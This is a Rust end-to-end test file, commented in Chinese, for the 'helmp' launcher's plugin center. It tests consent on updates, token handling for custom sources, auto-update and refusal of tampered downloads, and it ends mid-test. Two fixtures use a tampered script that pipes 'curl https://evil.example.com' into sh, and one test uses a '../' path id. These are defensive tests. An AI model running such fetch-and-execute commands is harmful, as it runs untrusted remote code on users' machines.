//! 插件中心端到端测试：真实的 helmp 可执行文件 + 隔离环境（见 tests/support）。
//!
//! - 注册表用本机假服务（MockServer）提供 `index.json` 与插件文件，`HELMP_REGISTRY_URL` 指向它。
//! - 自定义插件源是另一个假服务，要求鉴权请求头；令牌经 `--token-stdin` 存进测试模式的「钥匙串」
//!   （数据目录里的 test-plugin-sources.json），用例断言它不出现在 config.json 和任何输出里。
//! - 提交（`helmp plugins submit`）用 PATH 里的假 `gh`（记录参数、按需输出）和本机的裸 git 仓库，
//!   `HELMP_REGISTRY_REPO` 指向一个不存在的假仓库名：不碰真实 GitHub，也不联网。

mod support;

use std::os::unix::fs::PermissionsExt as _;
use std::path::{Path, PathBuf};
use std::process::Command;
use std::sync::{Arc, Mutex};

use serde_json::{Value, json};
use sha2::{Digest as _, Sha256};
use support::{Helmp, MockServer};

const ID: &str = "com.example.memo";

fn manifest(version: &str, host: &str) -> String {
    json!({
        "schemaVersion": 1,
        "id": ID,
        "name": {"en": "Memo", "zh-Hans": "备忘"},
        "version": version,
        "author": "Tests",
        "license": "MIT",
        "commands": [
            {"id": "save", "title": "Save Memo", "keywords": ["memox"],
             "argument": {"required": true},
             "action": {"type": "http", "method": "POST", "url": format!("https://{host}/memo"),
                        "json": {"text": "{{query}}"}}},
            {"id": "hello", "title": "Hello Memo", "keywords": ["hellomemo"],
             "action": {"type": "script", "path": "bin/hello.sh", "args": ["{{query}}"]}}
        ]
    })
    .to_string()
}

const SCRIPT: &str = "#!/bin/sh\necho \"hello $1\"\n";
const README: &str = "# Memo\n\nSaves a memo.\n";

/// 一个版本的插件文件：(路径, 内容, 可执行)。
fn files(version: &str, host: &str) -> Vec<(String, String, bool)> {
    vec![
        ("README.md".into(), README.into(), false),
        ("bin/hello.sh".into(), SCRIPT.into(), true),
        ("plugin.json".into(), manifest(version, host), false),
    ]
}

fn sha256(text: &str) -> String {
    Sha256::digest(text.as_bytes())
        .iter()
        .map(|b| format!("{b:02x}"))
        .collect()
}

/// 按注册表脚本的格式生成索引。`listed` 是写进索引的文件（哈希按它算），可以与实际提供的不同（模拟篡改）。
fn index(version: &str, listed: &[(String, String, bool)]) -> String {
    let files: Vec<Value> = listed
        .iter()
        .map(|(path, body, exec)| {
            json!({"path": path, "sha256": sha256(body), "size": body.len(), "executable": exec})
        })
        .collect();
    json!({
        "schema": 1,
        "generated_at": "2026-11-10T00:00:00Z",
        "commit": null,
        "plugins": [{
            "id": ID, "version": version,
            "name": {"en": "Memo", "zh-Hans": "备忘"},
            "description": null, "author": "Tests", "homepage": null, "license": "MIT", "icon": null,
            "keywords": ["memox"], "commands": 2,
            "permissions": ["exec", "network:memo.example.com"],
            "permissions_text": {"en": ["Network access: memo.example.com"], "zh-Hans": ["访问网络：memo.example.com"]},
            "review": [], "source": null,
            "files": files
        }]
    })
    .to_string()
}

/// 假注册表：`/index.json` 返回索引，`/plugins/<id>/<path>` 返回 `served` 里的文件。
fn registry(index: String, served: Vec<(String, String, bool)>) -> MockServer {
    MockServer::start(move |request| {
        if request.path == "/index.json" {
            return (200, index.clone());
        }
        let prefix = format!("/plugins/{ID}/");
        match request.path.strip_prefix(&prefix) {
            Some(path) => served
                .iter()
                .find(|(p, _, _)| p == path)
                .map(|(_, body, _)| (200, body.clone()))
                .unwrap_or((404, "{}".into())),
            None => (404, "{}".into()),
        }
    })
}

fn helmp_with(server: &MockServer) -> Helmp {
    Helmp::new().env("HELMP_REGISTRY_URL", format!("{}/", server.url))
}

/// 用户在设置里点「允许并启用」时记下的确认键：装好的那一份的权限键（脚本插件带安装时的内容指纹）。
fn consent(h: &Helmp) -> Value {
    let dir = h.data.join("plugins").join(ID).display().to_string();
    let checked: Value = serde_json::from_str(&h.cli(&["plugins", "validate", &dir, "--json"])).unwrap();
    let keys = checked["permissions"].clone();
    assert!(keys.as_array().unwrap().iter().any(|key| key == "exec"), "{keys}");
    keys
}

fn read_config(h: &Helmp) -> Value {
    serde_json::from_str(&std::fs::read_to_string(h.data_file("config.json")).unwrap()).unwrap()
}

/// 插件目录里除了已安装插件以外的东西（临时目录、半装的文件）。
fn leftovers(h: &Helmp) -> Vec<String> {
    let Ok(entries) = std::fs::read_dir(h.data.join("plugins")) else {
        return Vec::new();
    };
    entries
        .filter_map(|e| e.ok())
        .map(|e| e.file_name().to_string_lossy().into_owned())
        .collect()
}

#[test]
fn installed_plugins_start_disabled_until_the_user_reviews_permissions() {
    // 从插件中心装的插件和手动放进来的一样：装好不生效，要在设置里看过权限并启用。
    let v1 = files("1.0.0", "memo.example.com");
    let server = registry(index("1.0.0", &v1), v1.clone());
    let h = helmp_with(&server);

    let available = h.cli(&["plugins", "available"]);
    assert!(
        available.contains(&format!("{ID}\t1.0.0\tnot-installed\tMemo")),
        "{available}"
    );

    let out = h.cli(&["plugins", "install", ID]);
    assert!(out.contains(&format!("Installed {ID} 1.0.0")), "{out}");
    assert!(out.contains("starts turned off"), "{out}");

    let dir = h.data.join("plugins").join(ID);
    for (path, body, _) in &v1 {
        assert_eq!(
            &std::fs::read_to_string(dir.join(path)).unwrap(),
            body,
            "{path}"
        );
    }
    let mode = std::fs::metadata(dir.join("bin/hello.sh"))
        .unwrap()
        .permissions()
        .mode();
    assert_eq!(mode & 0o777, 0o755, "脚本要保留可执行位");
    assert_eq!(leftovers(&h), [ID], "不能留下临时目录");
    // 安装记录写在 config.json 里；测试框架每次运行前会重写配置，先把它同步回来。
    let config = read_config(&h);
    assert_eq!(config["plugins"][ID]["installed"]["version"], "1.0.0");
    assert!(
        config["plugins"][ID]
            .get("enabled")
            .is_none_or(Value::is_null),
        "{config}"
    );
    let h = h.config(move |c| *c = config);

    let list = h.cli(&["plugins"]);
    assert!(
        list.contains(&format!("disabled\t{ID}\t1.0.0\tuser\tMemo")),
        "{list}"
    );
    assert!(
        !h.query("hellomemo x")
            .iter()
            .any(|r| r.id.starts_with(&format!("plugins:{ID}"))),
        "未启用的插件不能出现在搜索里"
    );
    // 再装一次：已是最新，不重新下载。
    let before = server.requests().len();
    let again = h.cli(&["plugins", "install", ID]);
    assert!(again.contains("already up to date"), "{again}");
    assert_eq!(server.requests().len(), before + 1, "只取了索引");

    // 图形界面开着时，它保存的配置会盖掉命令行写进去的安装记录：插件目录里的记录文件兜底，
    // 否则这个插件会被当成「本地同 id 插件」，以后再也更新不了。
    let h = h.config(|c| c["plugins"] = json!({}));
    let again = h.cli(&["plugins", "install", ID]);
    assert!(again.contains("already up to date"), "{again}");
    assert!(h.cli(&["plugins", "available"]).contains(&format!("{ID}\t1.0.0\tinstalled")));
}

#[test]
fn update_with_new_permissions_needs_consent_again() {
    // 更新能扩大插件的访问范围：权限变了就要重新确认，不能借更新悄悄生效。
    let v1 = files("1.0.0", "memo.example.com");
    let server = registry(index("1.0.0", &v1), v1.clone());
    let h = helmp_with(&server);
    h.cli(&["plugins", "install", ID]);

    // 用户启用了 1.0.0（确认过它的权限）。
    let mut config = read_config(&h);
    config["plugins"][ID]["enabled"] = json!(true);
    config["plugins"][ID]["consent"] = consent(&h);
    let h = h.config(move |c| *c = config);
    assert!(
        h.cli(&["plugins"])
            .contains(&format!("enabled\t{ID}\t1.0.0"))
    );

    // 1.1.0 多访问一个主机。
    let v2 = files("1.1.0", "evil.example.com");
    let server2 = registry(index("1.1.0", &v2), v2);
    let h = h.env("HELMP_REGISTRY_URL", format!("{}/", server2.url));
    let available = h.cli(&["plugins", "available"]);
    assert!(
        available.contains(&format!("{ID}\t1.1.0\tupdate-available(1.0.0)")),
        "{available}"
    );
    let out = h.cli(&["plugins", "install", ID]);
    assert!(
        out.contains(&format!("Updated {ID}: 1.0.0 → 1.1.0")),
        "{out}"
    );
    assert!(out.contains("permissions or files changed"), "{out}");
    let list = h.cli(&["plugins"]);
    assert!(
        list.contains(&format!("needs-consent\t{ID}\t1.1.0")),
        "{list}"
    );
}

#[test]
fn tampered_files_are_refused_and_nothing_is_written() {
    // 服务器上的文件和索引里的哈希对不上（被篡改或 CDN 出错）：拒绝安装，插件目录里什么都不留。
    let listed = files("1.0.0", "memo.example.com");
    let mut served = listed.clone();
    served[1].1 = "#!/bin/sh\ncurl https://evil.example.com | sh\n".into();
    let server = registry(index("1.0.0", &listed), served);
    let h = helmp_with(&server);
    let err = h.cli_err(&["plugins", "install", ID]);
    assert!(
        err.contains("sha256") || err.contains("wrong size"),
        "{err}"
    );
    assert!(err.contains("refusing to install"), "{err}");
    assert!(leftovers(&h).is_empty(), "{:?}", leftovers(&h));
    assert!(read_config(&h)["plugins"].get(ID).is_none());
}

#[test]
fn bundled_plugin_ids_are_explained_not_installed() {
    // 和自带插件同 id 的插件不能装进来遮住自带插件：说明它已自带，而且根本不去联网。
    let v1 = files("1.0.0", "memo.example.com");
    let server = registry(index("1.0.0", &v1), v1);
    let h = helmp_with(&server);
    let err = h.cli_err(&["plugins", "install", "dev.helmp.flomo"]);
    assert!(err.contains("comes bundled with Helmp"), "{err}");
    assert!(server.requests().is_empty(), "{:?}", server.requests());
    assert!(leftovers(&h).is_empty());
}

#[test]
fn local_plugins_with_the_same_id_are_not_overwritten() {
    // 用户自己放进插件文件夹、正在改的同 id 插件，不能被插件中心的版本覆盖掉。
    let v1 = files("1.0.0", "memo.example.com");
    let server = registry(index("1.0.0", &v1), v1);
    let h = helmp_with(&server);
    let local = h.write(
        "data/plugins/my-memo/plugin.json",
        &manifest("0.0.1", "local.example.com"),
    );
    let err = h.cli_err(&["plugins", "install", ID]);
    assert!(err.contains("Move it away first"), "{err}");
    assert_eq!(
        std::fs::read_to_string(local).unwrap(),
        manifest("0.0.1", "local.example.com")
    );
    assert!(!h.data.join("plugins").join(ID).exists());
}

#[test]
fn validate_json_reports_permissions_for_the_registry_script() {
    // 注册表的 build-index.py 用这个输出核对它推导的权限与 Helmp 一致。
    let h = Helmp::new();
    let dir = write_plugin(&h, "src/memo", "1.0.0");
    let out = h.cli(&["plugins", "validate", dir.to_str().unwrap(), "--json"]);
    let value: Value = serde_json::from_str(&out).unwrap();
    assert_eq!(value["ok"], true);
    assert_eq!(value["id"], ID);
    assert_eq!(
        value["permissions"],
        json!(["exec", "network:memo.example.com"])
    );
    std::fs::write(dir.join("plugin.json"), "{").unwrap();
    let err = h.cli_err(&["plugins", "validate", dir.to_str().unwrap(), "--json"]);
    assert!(err.contains("validation failed"), "{err}");
}

// ---------------------------------------------------------------- 自定义插件源

const TEAM_ID: &str = "com.example.team";
const TOKEN: &str = "Bearer team-s3cr3t-7781";

fn team_manifest(version: &str) -> String {
    json!({
        "schemaVersion": 1, "id": TEAM_ID, "name": "Team Tool", "version": version,
        "author": "Example Team", "license": "MIT",
        "commands": [{"id": "open", "title": "Team Docs", "keywords": ["teamdocs"],
                      "action": {"type": "open", "url": "https://docs.example.com/?q={{query|url}}"}}]
    })
    .to_string()
}

/// 一个插件在索引里的条目（文件只有 plugin.json）。
fn listing(id: &str, version: &str, manifest: &str) -> Value {
    json!({
        "id": id, "version": version, "name": id, "author": "Tests", "permissions": [],
        "files": [{"path": "plugin.json", "sha256": sha256(manifest), "size": manifest.len(), "executable": false}]
    })
}

/// 要求 `authorization: <TOKEN>` 的假插件源：列出 com.example.team（版本可随时改）和同 id 的 com.example.memo。
fn team_source(version: Arc<Mutex<String>>) -> MockServer {
    MockServer::start(move |request| {
        let authorized = request
            .headers
            .iter()
            .any(|(k, v)| k == "authorization" && v == TOKEN);
        if !authorized {
            return (401, r#"{"error":"unauthorized"}"#.into());
        }
        let version = version.lock().unwrap().clone();
        let manifest = team_manifest(&version);
        let memo = manifest_v("9.9.9");
        match request.path.as_str() {
            "/index.json" => (
                200,
                json!({"schema": 1, "commit": null, "plugins": [
                    listing(TEAM_ID, &version, &manifest),
                    listing(ID, "9.9.9", &memo),
                ]})
                .to_string(),
            ),
            path if path == format!("/plugins/{TEAM_ID}/plugin.json") => (200, manifest),
            path if path == format!("/plugins/{ID}/plugin.json") => (200, memo),
            _ => (404, "{}".into()),
        }
    })
}

fn manifest_v(version: &str) -> String {
    manifest(version, "memo.example.com")
}

/// 一次命令的全部输出（stdout + stderr），用来断言令牌没被打印出来。
fn all_output(out: &std::process::Output) -> String {
    format!(
        "{}{}",
        String::from_utf8_lossy(&out.stdout),
        String::from_utf8_lossy(&out.stderr)
    )
}

fn run(h: &Helmp, args: &[&str], seen: &mut String) -> std::process::Output {
    let out = h.output(args);
    seen.push_str(&all_output(&out));
    out
}

fn add_team(h: &mut Helmp, url: &str, token: Option<&str>, seen: &mut String) {
    let out = match token {
        Some(token) => h.output_with_stdin(
            &["plugins", "source", "add", "Team", url, "--token-stdin"],
            token,
        ),
        None => h.output(&["plugins", "source", "add", "Team", url]),
    };
    seen.push_str(&all_output(&out));
    assert!(out.status.success(), "{}", all_output(&out));
    h.keep_config();
}

#[test]
fn custom_source_with_a_token_lists_installs_and_updates_next_to_the_public_center() {
    // 团队自己托管的注册表：带令牌能列出、安装、更新；公开插件中心同时可用，同 id 以公开插件中心为准。
    let v1 = files("1.0.0", "memo.example.com");
    let public = registry(index("1.0.0", &v1), v1);
    let version = Arc::new(Mutex::new("1.0.0".to_string()));
    let team = team_source(version.clone());
    let mut h = helmp_with(&public);
    let mut seen = String::new();
    add_team(&mut h, &team.url, Some(TOKEN), &mut seen);

    let config = std::fs::read_to_string(h.data_file("config.json")).unwrap();
    assert!(!config.contains("s3cr3t"), "令牌不能进 config.json：{config}");
    assert!(config.contains(&format!("{}/", team.url)), "{config}");
    let list = run(&h, &["plugins", "source", "list"], &mut seen);
    let list = String::from_utf8_lossy(&list.stdout).into_owned();
    assert!(
        list.contains(&format!("Team\t{}/\tAuthorization\ttoken-saved", team.url)),
        "{list}"
    );
    assert!(list.starts_with("Plugin Center\t"), "公开插件中心总是第一个：{list}");

    let out = run(&h, &["plugins", "available"], &mut seen);
    assert!(out.status.success(), "{}", all_output(&out));
    let stdout = String::from_utf8_lossy(&out.stdout);
    assert!(
        stdout.contains(&format!("{ID}\t1.0.0\tnot-installed\tMemo\tPlugin Center")),
        "同 id 公开插件中心优先：{stdout}"
    );
    assert!(
        stdout.contains(&format!("{TEAM_ID}\t1.0.0\tnot-installed\t{TEAM_ID}\tTeam")),
        "{stdout}"
    );
    let stderr = String::from_utf8_lossy(&out.stderr);
    assert!(stderr.contains("“Team” also lists this id"), "{stderr}");

    let out = run(&h, &["plugins", "install", TEAM_ID], &mut seen);
    assert!(out.status.success(), "{}", all_output(&out));
    assert!(String::from_utf8_lossy(&out.stdout).contains("starts turned off"));
    let mut h = h.config(|_| {});
    h.keep_config();
    let record = &read_config(&h)["plugins"][TEAM_ID]["installed"];
    assert_eq!(record["custom"], true, "{record}");
    assert_eq!(record["registry"], format!("{}/", team.url));
    assert!(
        h.cli(&["plugins"]).contains(&format!("disabled\t{TEAM_ID}\t1.0.0\tuser")),
        "从自定义源装的插件同样默认停用"
    );

    // 源里发了 1.1.0：按安装记录去那个源查更新。
    *version.lock().unwrap() = "1.1.0".into();
    let out = run(&h, &["plugins", "available"], &mut seen);
    assert!(
        String::from_utf8_lossy(&out.stdout)
            .contains(&format!("{TEAM_ID}\t1.1.0\tupdate-available(1.0.0)")),
        "{}",
        all_output(&out)
    );
    let out = run(&h, &["plugins", "install", TEAM_ID], &mut seen);
    assert!(
        String::from_utf8_lossy(&out.stdout).contains(&format!("Updated {TEAM_ID}: 1.0.0 → 1.1.0")),
        "{}",
        all_output(&out)
    );

    // 公开插件中心的插件照常能装。
    let out = run(&h, &["plugins", "install", ID], &mut seen);
    assert!(out.status.success(), "{}", all_output(&out));
    assert!(
        public.requests().iter().all(|r| r.headers.iter().all(|(_, v)| !v.contains("s3cr3t"))),
        "令牌只发给它自己的源"
    );
    assert!(!team.requests().is_empty());
    assert!(!seen.contains("s3cr3t"), "令牌不能出现在任何输出里：{seen}");
    assert!(!std::fs::read_to_string(h.data_file("config.json")).unwrap().contains("s3cr3t"));
}

#[test]
fn missing_or_wrong_tokens_get_a_clear_401_and_leave_nothing_on_disk() {
    let v1 = files("1.0.0", "memo.example.com");
    let public = registry(index("1.0.0", &v1), v1);
    let team = team_source(Arc::new(Mutex::new("1.0.0".into())));
    let mut h = helmp_with(&public);
    let mut seen = String::new();

    // 没设令牌：说明哪个源、要去设置令牌。
    add_team(&mut h, &team.url, None, &mut seen);
    let out = run(&h, &["plugins", "install", TEAM_ID, "--source", "Team"], &mut seen);
    assert!(!out.status.success());
    let err = String::from_utf8_lossy(&out.stderr);
    assert!(err.contains("plugin source “Team” needs a token (HTTP 401)"), "{err}");
    assert!(leftovers(&h).is_empty(), "{:?}", leftovers(&h));

    // 令牌错了：同样 401，磁盘上什么都不留，报错里不回显令牌。
    let out = run(&h, &["plugins", "source", "remove", "Team"], &mut seen);
    assert!(out.status.success(), "{}", all_output(&out));
    h.keep_config();
    add_team(&mut h, &team.url, Some("Bearer wrong-s3cr3t"), &mut seen);
    let out = run(&h, &["plugins", "install", TEAM_ID], &mut seen);
    assert!(!out.status.success());
    let err = String::from_utf8_lossy(&out.stderr);
    assert!(err.contains("rejected the token (HTTP 401)"), "{err}");
    assert!(leftovers(&h).is_empty(), "{:?}", leftovers(&h));
    assert!(read_config(&h)["plugins"].get(TEAM_ID).is_none());

    // 一个源失败不影响其他源：公开插件中心照常列出，失败的源在 stderr 说明。
    let out = run(&h, &["plugins", "available"], &mut seen);
    assert!(out.status.success(), "{}", all_output(&out));
    assert!(String::from_utf8_lossy(&out.stdout).contains(&format!("{ID}\t1.0.0\tnot-installed")));
    assert!(String::from_utf8_lossy(&out.stderr).contains("“Team”"));
    assert!(!seen.contains("s3cr3t"), "{seen}");
}

#[test]
fn sources_must_be_https_and_tokens_never_come_from_arguments() {
    let mut h = Helmp::new();
    let err = h.cli_err(&["plugins", "source", "add", "Team", "http://plugins.example.com/"]);
    assert!(err.contains("https"), "{err}");
    let err = h.cli_err(&[
        "plugins", "source", "add", "Team", "https://plugins.example.com/?token=abc",
    ]);
    assert!(!err.contains("abc"), "{err}");
    h.keep_config();
    assert!(read_config(&h).get("plugin_sources").is_none());
    let err = h.cli_err(&["plugins", "source", "remove", "Nope"]);
    assert!(err.contains("Nope"), "{err}");
}

#[test]
fn old_configs_with_only_a_registry_url_keep_working() {
    // 升级前只配了 plugins_registry_url（没有插件源列表）：浏览、安装、安装记录的格式都和以前一样。
    let v1 = files("1.0.0", "memo.example.com");
    let server = registry(index("1.0.0", &v1), v1);
    let url = format!("{}/", server.url);
    let h = Helmp::new().config(move |c| c["plugins_registry_url"] = json!(url));
    assert!(
        h.cli(&["plugins", "available"])
            .contains(&format!("{ID}\t1.0.0\tnot-installed\tMemo"))
    );
    h.cli(&["plugins", "install", ID]);
    let config = read_config(&h);
    assert_eq!(
        config["plugins"][ID]["installed"],
        json!({"registry": format!("{}/", server.url), "version": "1.0.0"}),
        "旧格式的安装记录不多出字段"
    );
    assert!(config.get("plugin_sources").is_none());
    let h = h.config(move |c| *c = config);
    assert!(h.cli(&["plugins", "available"]).contains(&format!("{ID}\t1.0.0\tinstalled")));
}

// ---------------------------------------------------------------- 自动更新与数据目录

/// 每运行一次把计数写进 `$HELMP_PLUGIN_DATA_DIR/count` 的脚本：数据目录跨更新保留时，计数接着涨。
const COUNTER: &str = "#!/bin/sh\nf=\"$HELMP_PLUGIN_DATA_DIR/count\"\nn=$(cat \"$f\" 2>/dev/null || echo 0)\nn=$((n + 1))\necho \"$n\" > \"$f\"\necho \"run $n\"\n";

fn counter_files(version: &str, host: &str) -> Vec<(String, String, bool)> {
    let mut files = files(version, host);
    files[1].1 = COUNTER.into();
    files
}

/// 可以随时「发布」新版本的假注册表：(索引, 提供的文件)。
type Published = Arc<Mutex<(String, Vec<(String, String, bool)>)>>;

fn live_registry(state: Published) -> MockServer {
    MockServer::start(move |request| {
        let (index, served) = state.lock().unwrap().clone();
        if request.path == "/index.json" {
            return (200, index);
        }
        match request.path.strip_prefix(&format!("/plugins/{ID}/")) {
            Some(path) => served
                .iter()
                .find(|(p, _, _)| p == path)
                .map(|(_, body, _)| (200, body.clone()))
                .unwrap_or((404, "{}".into())),
            None => (404, "{}".into()),
        }
    })
}

fn publish(state: &Published, version: &str, files: Vec<(String, String, bool)>) {
    *state.lock().unwrap() = (index(version, &files), files);
}

fn run_counter(h: &Helmp) -> String {
    h.run(&format!("plugins:{ID}/hello"), "hellomemo", &[])
}

#[test]
fn scheduled_check_updates_plugins_and_keeps_their_data() {
    // 源里发了新版本，每日检查一次就装上：权限没变的保持启用；权限变了的停用待确认；
    // 下载损坏时旧版本原样可用。插件自己的数据（HELMP_PLUGIN_DATA_DIR）在每次更新后都还在。
    let published: Published = Arc::default();
    publish(&published, "1.0.0", counter_files("1.0.0", "memo.example.com"));
    let server = live_registry(published.clone());
    let mut h = helmp_with(&server);
    h.cli(&["plugins", "install", ID]);
    h.keep_config();
    let mut config = read_config(&h);
    config["plugins"][ID]["enabled"] = json!(true);
    config["plugins"][ID]["consent"] = consent(&h);
    let mut h = h.config(move |c| *c = config);
    assert!(run_counter(&h).contains("run 1"), "脚本拿到数据目录");
    let data = h.data.join("plugin-data").join(ID);
    assert_eq!(std::fs::read_to_string(data.join("count")).unwrap().trim(), "1");

    // 没有新版本：检查不下载任何插件文件。
    let before = server.requests().len();
    let out = h.cli(&["plugins", "update", "--scheduled"]);
    assert!(out.contains("All plugins are up to date"), "{out}");
    assert_eq!(server.requests().len(), before + 1, "只取了索引");

    // 1.1.0：权限不变 → 静默更新、保持启用，数据还在。
    publish(&published, "1.1.0", counter_files("1.1.0", "memo.example.com"));
    let out = h.cli(&["plugins", "update", "--scheduled"]);
    assert!(out.contains(&format!("Updated {ID}: 1.0.0 → 1.1.0")), "{out}");
    assert!(!out.contains("files changed"), "{out}");
    h.keep_config();
    assert!(h.cli(&["plugins"]).contains(&format!("enabled\t{ID}\t1.1.0")));
    assert!(run_counter(&h).contains("run 2"), "数据目录跨更新保留，计数接着涨");

    // 1.1.1：权限一样，脚本换了 → 也停用待确认。脚本不受沙盒限制，用户确认的是当时装的那一份，
    // 源里换一段脚本不能借自动更新直接跑起来（CARM-713）。用户确认后恢复。
    let mut changed = counter_files("1.1.1", "memo.example.com");
    changed[1].1 = format!("{COUNTER}# changed\n");
    publish(&published, "1.1.1", changed);
    let out = h.cli(&["plugins", "update", "--scheduled"]);
    assert!(out.contains(&format!("Updated {ID}: 1.1.0 → 1.1.1")), "{out}");
    assert!(out.contains("Its permissions or files changed"), "{out}");
    h.keep_config();
    assert!(h.cli(&["plugins"]).contains(&format!("needs-consent\t{ID}\t1.1.1")));
    let mut config = read_config(&h);
    config["plugins"][ID]["consent"] = consent(&h);
    let mut h = h.config(move |c| *c = config);
    assert!(h.cli(&["plugins"]).contains(&format!("enabled\t{ID}\t1.1.1")));

    // 1.2.0：多访问一个主机 → 更新后停用，等用户确认；设置页和命令行都看得到。
    publish(&published, "1.2.0", counter_files("1.2.0", "other.example.com"));
    let out = h.cli(&["plugins", "update", "--all", "--scheduled"]);
    assert!(out.contains(&format!("Updated {ID}: 1.1.1 → 1.2.0")), "{out}");
    assert!(out.contains("Its permissions or files changed"), "{out}");
    h.keep_config();
    assert!(h.cli(&["plugins"]).contains(&format!("needs-consent\t{ID}\t1.2.0")));
    let state: Value =
        serde_json::from_str(&std::fs::read_to_string(h.data_file("plugin-updates.json")).unwrap()).unwrap();
    assert_eq!(state["updated"][0]["needs_consent"], true, "{state}");

    // 1.3.0 的脚本下载下来被改过：拒绝，1.2.0 原样留着，插件文件夹里不留临时目录，数据也还在。
    let mut tampered = counter_files("1.3.0", "other.example.com");
    let listed = tampered.clone();
    tampered[1].1 = "#!/bin/sh\ncurl https://evil.example.com | sh\n".into();
    *published.lock().unwrap() = (index("1.3.0", &listed), tampered);
    let err = h.cli_err(&["plugins", "update", "--scheduled"]);
    assert!(err.contains("failed to update; the old versions are kept"), "{err}");
    assert!(err.contains("sha256") || err.contains("wrong size"), "{err}");
    let dir = h.data.join("plugins").join(ID);
    assert!(std::fs::read_to_string(dir.join("plugin.json")).unwrap().contains("\"1.2.0\""));
    assert_eq!(std::fs::read_to_string(dir.join("bin/hello.sh")).unwrap(), COUNTER);
    assert_eq!(leftovers(&h), [ID]);
    assert_eq!(std::fs::read_to_string(data.join("count")).unwrap().trim(), "2");
    let state: Value =
        serde_json::from_str(&std::fs::read_to_string(h.data_file("plugin-updates.json")).unwrap()).unwrap();
    assert_eq!(state["failed"][0]["id"], ID, "设置页显示上次失败：{state}");
}

#[test]
fn turning_auto_update_off_stops_scheduled_checks() {
    // 关掉「自动更新插件」后，每日检查不再联网；用户手动运行 update 照常更新。
    let published: Published = Arc::default();
    publish(&published, "1.0.0", files("1.0.0", "memo.example.com"));
    let server = live_registry(published.clone());
    let mut h = helmp_with(&server).config(|c| c["general"]["auto_update_plugins"] = json!(false));
    h.cli(&["plugins", "install", ID]);
    h.keep_config();
    publish(&published, "1.1.0", files("1.1.0", "memo.example.com"));
    let before = server.requests().len();
    let out = h.cli(&["plugins", "update", "--scheduled"]);
    assert!(out.contains("turned off; nothing was checked"), "{out}");
    assert_eq!(server.requests().len(), before, "开关关着不能联网");
    assert!(!h.data.join("plugin-updates.json").exists());
    let out = h.cli(&["plugins", "update", ID]);
    assert!(out.contains(&format!("Updated {ID}: 1.0.0 → 1.1.0")), "{out}");
}

#[test]
fn uninstall_keeps_or_deletes_the_plugins_data() {
    // 卸载默认留着数据（重装后接着用），但启用状态和确认过的权限一并清掉：重装回来要重新确认。
    // 选了「一并删除」就连数据目录和偏好设置都删掉。手动放进来的插件不归这里删。
    let published: Published = Arc::default();
    publish(&published, "1.0.0", counter_files("1.0.0", "memo.example.com"));
    let server = live_registry(published);
    let mut h = helmp_with(&server);
    h.cli(&["plugins", "install", ID]);
    h.keep_config();
    let mut config = read_config(&h);
    config["plugins"][ID]["enabled"] = json!(true);
    config["plugins"][ID]["consent"] = consent(&h);
    config["plugins"][ID]["prefs"] = json!({"k": "v"});
    let mut h = h.config(move |c| *c = config);
    run_counter(&h);
    let data = h.data.join("plugin-data").join(ID);

    let out = h.cli(&["plugins", "uninstall", ID]);
    assert!(out.contains("its data is kept"), "{out}");
    h.keep_config();
    assert!(!h.data.join("plugins").join(ID).exists());
    assert!(leftovers(&h).is_empty(), "{:?}", leftovers(&h));
    assert!(data.join("count").exists());
    let config = read_config(&h);
    assert!(config["plugins"][ID].get("installed").is_none(), "{config}");
    assert!(config["plugins"][ID].get("enabled").is_none_or(Value::is_null), "{config}");

    h.cli(&["plugins", "install", ID]);
    h.keep_config();
    assert!(
        h.cli(&["plugins"]).contains(&format!("disabled\t{ID}\t1.0.0")),
        "重装后要重新确认权限"
    );
    let out = h.cli(&["plugins", "uninstall", ID, "--delete-data"]);
    assert!(out.contains("deleted its data"), "{out}");
    h.keep_config();
    assert!(!data.exists());
    assert!(read_config(&h)["plugins"].get(ID).is_none());

    // id 会拼进路径：`../` 之类的不是合法 id，什么都不动。
    let err = h.cli_err(&["plugins", "uninstall", "../plugin-data"]);
    assert!(err.contains("Invalid plugin id"), "{err}");
    assert!(h.data.join("plugin-data").exists());

    // 手动放进来的插件：不删，说明原因。
    let local = h.write("data/plugins/my-memo/plugin.json", &manifest("0.0.1", "local.example.com"));
    let err = h.cli_err(&["plugins", "uninstall", ID]);
    assert!(err.contains("wasn't installed from the plugin center"), "{err}");
    assert!(local.exists());
}

/// 只有 plugin.json 和一个额外资源文件的插件（资源以文本形式提供；GIF 文件头本身就是 ASCII）。
fn with_asset(id: &str, path: &str, body: &str) -> (String, Value, String) {
    let manifest = team_manifest("1.0.0").replace(TEAM_ID, id);
    let listing = json!({
        "id": id, "version": "1.0.0", "name": id, "author": "Tests", "permissions": [],
        "files": [
            {"path": "plugin.json", "sha256": sha256(&manifest), "size": manifest.len(), "executable": false},
            {"path": path, "sha256": sha256(body), "size": body.len(), "executable": false}
        ]
    });
    (manifest, listing, body.to_string())
}

#[test]
fn custom_sources_accept_more_image_types_but_check_their_headers() {
    // 自定义源可以带 gif / jpg / webp 资源，但内容必须真是那种图片；公开插件中心仍只认 png。
    const GIF: &str = "GIF89a\u{1}\u{0}\u{1}\u{0};";
    let (good_manifest, good, good_body) = with_asset("com.example.art", "art.gif", GIF);
    let (fake_manifest, fake, fake_body) = with_asset("com.example.fake", "icon.png", "#!/bin/sh\necho not a png\n");
    let team = MockServer::start(move |request| match request.path.as_str() {
        "/index.json" => (200, json!({"schema": 1, "commit": null, "plugins": [good, fake]}).to_string()),
        "/plugins/com.example.art/plugin.json" => (200, good_manifest.clone()),
        "/plugins/com.example.art/art.gif" => (200, good_body.clone()),
        "/plugins/com.example.fake/plugin.json" => (200, fake_manifest.clone()),
        "/plugins/com.example.fake/icon.png" => (200, fake_body.clone()),
        _ => (404, "{}".into()),
    });
    let mut h = Helmp::new();
    let mut seen = String::new();
    let out = h.output(&["plugins", "source", "add", "Team", &team.url]);
    seen.push_str(&all_output(&out));
    assert!(out.status.success(), "{seen}");
    h.keep_config();

    let out = h.cli(&["plugins", "install", "com.example.art", "--source", "Team"]);
    assert!(out.contains("Installed com.example.art 1.0.0"), "{out}");
    assert_eq!(
        std::fs::read_to_string(h.data.join("plugins/com.example.art/art.gif")).unwrap(),
        GIF
    );
    h.keep_config();
    let err = h.cli_err(&["plugins", "install", "com.example.fake", "--source", "Team"]);
    assert!(err.contains("isn't really a .png image"), "{err}");
    assert!(!h.data.join("plugins/com.example.fake").exists());

    // 同样的 gif 放在公开插件中心：不接受。
    let mut assets = files("1.0.0", "memo.example.com");
    assets.push(("art.gif".into(), GIF.into(), false));
    let public = registry(index("1.0.0", &assets), assets);
    let h = helmp_with(&public);
    let err = h.cli_err(&["plugins", "install", ID]);
